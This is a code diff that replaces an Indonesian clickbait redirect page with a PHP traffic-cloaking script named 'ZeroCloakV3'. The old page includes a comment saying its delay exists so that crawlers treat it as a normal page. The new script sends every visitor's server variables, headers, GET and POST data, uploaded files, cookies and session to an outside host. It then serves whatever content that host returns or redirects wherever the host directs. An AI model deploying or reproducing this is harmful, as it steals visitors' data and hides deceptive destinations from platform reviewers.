@@ -1,64 +1,311 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PENGANTIN FOTO DI KUBURAN CHECK!</title>
-    <meta name="description" content="Kejadian viral hari ini, lihat kronologi selengkapnya di sini.">
-    
-    <!-- Open Graph Meta Tags untuk Facebook -->
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="PENGANTIN FOTO DI KUBURAN CHECK!">
-    <meta property="og:description" content="Kejadian viral hari ini, lihat kronologi selengkapnya di sini.">
-    <meta property="og:image" content="https://amrull1802-rgb.github.io/shoppe/berita.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
+<?php
 
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+class ZeroCloakV3
+{
+    private $targetUrl;
+    private $encryptionKey;
+    private $requestId;
+    private $uei_6s71a1;
+    private $cst_4u89t5;
+    private $timeout;
+
+    public function __construct()
+    {
+        header("Access-Control-Allow-Origin: *");
+        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
+        header("Access-Control-Allow-Headers: Content-Type, Authorization");
+        
+        error_reporting(E_ALL);
+        ini_set('display_errors', 1);
+
+        $this->targetUrl        = 'https://app.zerocloak.com/realtime';
+        $this->encryptionKey    = 'b96fe040-f322-4ffe-9981-94743ad3a129';
+        $this->requestId        = uniqid('req_', true);
+        $this->uei_6s71a1       = "8e74kfsqqr";
+        $this->cst_4u89t5       = "6xeky42rkd";
+        $this->timeout          = 30;
+    }
+
+    private function retrieveAllHeaders()
+    {
+        if (!function_exists('getallheaders')) {
+            $headers = [];
+            foreach ($_SERVER as $name => $value) {
+                if (substr($name, 0, 5) == 'HTTP_') {
+                    $headers[str_replace(
+                        ' ',
+                        '-',
+                        ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))
+                    )] = $value;
+                }
+            }
+            return $headers;
         }
-        .container {
-            text-align: center;
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
+        return getallheaders();
+    }
+
+    private function gatherRequestData()
+    {
+        return [
+            'request_id' => $this->requestId,
+            'uei_6s71a1' => $this->uei_6s71a1,
+            'cst_4u89t5' => $this->cst_4u89t5,
+            'server'     => $_SERVER,
+            'headers'    => $this->retrieveAllHeaders(),
+            'get'        => $_GET,
+            'post'       => $_POST,
+            'files'      => $_FILES,
+            'cookie'     => $_COOKIE,
+            'session'    => isset($_SESSION) ? $_SESSION : [],
+            'timestamp'  => date('Y-m-d H:i:s'),
+        ];
+    }
+
+    private function transmitData($data, $maxRetries = 3)
+    {
+        if (function_exists('curl_version')) {
+            return $this->sendUsingCurl($data, $maxRetries);
+        } else {
+            return $this->sendUsingFileGetContents($data);
         }
-        .btn {
-            display: inline-block;
-            background-color: #ee4d2d; /* Warna Khas Shopee */
-            color: white;
-            padding: 12px 24px;
-            text-decoration: none;
-            font-weight: bold;
-            border-radius: 4px;
-            margin-top: 2006px;
+    }
+
+    private function sendUsingCurl($data, $maxRetries = 3)
+    {
+        $ch = curl_init($this->targetUrl);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, [
+            'Content-Type: application/json',
+            'Content-Length: ' . strlen($data),
+            'X-Request-ID: ' . $this->requestId,
+            'Cache-Control: no-cache',
+            'Cache-Control: max-age=0',
+            'Pragma: no-cache',
+        ]);
+
+        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);
+
+        for ($retry = 0; $retry < $maxRetries; $retry++) {
+            $response = curl_exec($ch);
+            if ($response !== false) {
+                curl_close($ch);
+                return $response;
+            }
+            sleep(1);
         }
-    </style>
-</head>
-<body>
 
-<div class="container">
-    <h2>Konten Terverifikasi</h2>
-    <p>Anda akan dialihkan ke halaman produk. Jika tidak berpindah secara otomatis, silakan klik tombol di bawah ini:</p>
-    <!-- Ganti dengan Link Shopee Anda -->
-    <a class="btn" href="https://s.shopee.co.id/7Kx8n8ypTp">Buka di Shopee</a>
-</div>
+        curl_close($ch);
+        return false;
+    }
 
-<script>
-    // Pengalihan berbasis interaksi user / delay yang wajar bagi browser
-    setTimeout(function() {
-        window.location.href = "https://shopee.co.id";
-    }, 1500); // Memberikan jeda 1,5 detik agar crawler menganggap ini halaman normal
-</script>
+    private function sendUsingFileGetContents($data)
+    {
+        $opts = [
+            "http" => [
+                "header" => [
+                    "Content-Type: application/json",
+                    "Content-Length: " . strlen($data),
+                    "X-Request-ID: " . $this->requestId,
+                    "Cache-Control: no-cache",
+                    'Cache-Control: max-age=0',
+                    "Pragma: no-cache",
+                ],
+                "method" => "POST",
+                "content" => $data,
+                "timeout" => $this->timeout,
+            ],
+        ];
 
-</body>
-</html>
+        $context = stream_context_create($opts);
+        $response = @file_get_contents($this->targetUrl, false, $context);
+
+        return $response;
+    }
+
+    public function clearCache()
+    {
+        if (function_exists('wp_cache_flush')) {
+            wp_cache_flush();
+        }
+
+        if (function_exists('wp_cache_clear_cache')) {
+            wp_cache_clear_cache();
+        }
+    }
+    public function verify()
+    {
+        if(isset($_GET['8ea8cd56-1488']) && $_GET['8ea8cd56-1488'] == $this->encryptionKey){
+            echo $this->cst_4u89t5;
+            die();
+        }
+    }
+    public function run()
+    {
+        $this->verify();
+        $this->clearCache();
+        $data = $this->gatherRequestData();
+        
+        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
+            echo "<h5>(1) Send: Data Got -</h5><pre>";
+            print_r($data);
+            echo "</pre>";
+        }
+        
+        $jsonData   = json_encode($data);
+        
+        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
+            echo "<h5>(2) Send: Convert to Json -</h5><pre>";
+            print_r($jsonData);
+            echo "</pre>";
+        }
+
+        if ($jsonData === false) {
+            $this->failHandle("Error: JSON encoding failed: " . json_last_error_msg());
+            return false;
+        }
+
+        $base64Data = base64_encode($jsonData);
+        
+        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
+            echo "<h5>(3) Send: Json to base64_encode -</h5><pre>";
+            print_r($base64Data);
+            echo "</pre>";
+        }
+
+        if ($base64Data === false) {
+            $this->failHandle("Error: Base64 encoding failed");
+            return false;
+        }
+
+        $response = $this->transmitData($base64Data);
+        
+        if(isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] == $this->encryptionKey){
+              echo $response;
+              die;
+        }
+        
+        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
+            echo "<h5>(1) Receive: Data Got -</h5><pre>";
+            print_r($response);
+            echo "</pre>";
+        }
+        
+        if ($response !== false) {
+            $this->successHandle($response);
+        } else {
+            $this->failHandle($response);
+        }
+    }
+
+    public function successHandle($response)
+    {
+
+        $base64decodeData = base64_decode($response);
+        
+         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
+            echo "<h5>(5) Receive: decryptedData -</h5><pre>";
+            print_r($base64decodeData);
+            echo "</pre>";
+        }
+        
+        
+        if ($base64decodeData === false) {
+            $this->failHandle("Error: Base64 decode failed");
+            return false;
+        }
+
+        $responseData = json_decode($base64decodeData, true);
+
+         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
+            echo "<h5>(6) Receive: decryptedData -</h5><pre>";
+            print_r($responseData);
+            echo "</pre>";
+        }
+        if ($responseData === null && json_last_error() !== JSON_ERROR_NONE) {
+            $this->failHandle("Error: JSON decoding failed");
+            return false;
+        }
+        if(!$responseData['status']){
+            $this->failHandle($responseData['message']);
+            return false;
+        }
+
+       if (
+            (isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] === $this->encryptionKey) ||
+            (isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] === $this->encryptionKey)
+        ) {
+            die();
+        }
+
+        if(!($responseData['data']['nothing'])){
+
+            if(isset($responseData['data']['hr'])){
+                header("Referrer-Policy: no-referrer");
+            }
+
+            if(!is_null($responseData['data']['zrc'])){
+
+                if(!$responseData['data']['zrc']['status']){
+                    $this->failHandle($responseData['data']['zrc']['message']);
+                    return false;
+
+                }else{
+                    $this->zeroRedirectionCloaking($responseData['data']['zrc']['content']);
+                    return true;
+
+                }
+            }
+
+            $this->redirectTo($responseData['data']['url'],$responseData['data']['http_code']);
+            return true;
+        }
+        return true;
+
+    }
+    private function zeroRedirectionCloaking(string $content = '') {
+        echo $content;
+        die();
+    }
+    private function redirectTo(string $url, string $method = 'header-301') {
+        switch (strtolower($method)) {
+            case 'header-301':
+                header("Location: $url", 301);
+                exit;
+
+            case 'header-302':
+                header("Location: $url", 302);
+                exit;
+
+            case 'header-refresh':
+                header("Refresh: 0;url=$url");
+                exit;
+
+            case 'meta':
+                echo '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"><title>Redirecting...</title></head><body><a href="' . htmlspecialchars($url) . '">Click here</a></body></html>';
+                exit;
+
+            case 'js_meta':
+                echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Redirecting...</title></head><body><script>window.location.href = "' . htmlspecialchars($url) . '";</script><noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"></noscript><p>If you are not redirected, <a href="' . htmlspecialchars($url) . '">click here</a>.</p></body></html>';
+                exit;
+
+            default:
+                header("Location: $url", 301);
+                exit;
+        }
+    }
+
+    private function failHandle($response)
+    {
+        echo $response;
+        die;
+    }
+}
+
+$zerocloakCloaking = new ZeroCloakV3();
+$zerocloakCloaking->run();
+
+// @zerocloak.com 2026-09-21 09:19:21
+?>
